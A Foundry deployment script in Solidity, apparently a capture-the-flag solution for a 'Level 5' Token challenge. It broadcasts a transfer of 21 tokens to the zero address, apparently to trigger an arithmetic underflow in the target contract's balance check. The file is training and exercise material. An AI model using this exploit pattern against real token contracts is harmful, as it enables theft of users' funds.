// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Token.sol";

contract Level5Script is Script {
    Token token = Token(0x1020d8DDD04d639B7f1278dEc3c976aE6ac42980);

    function run() public {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        token.transfer(address(0), 21);

        vm.stopBroadcast();
    }
}
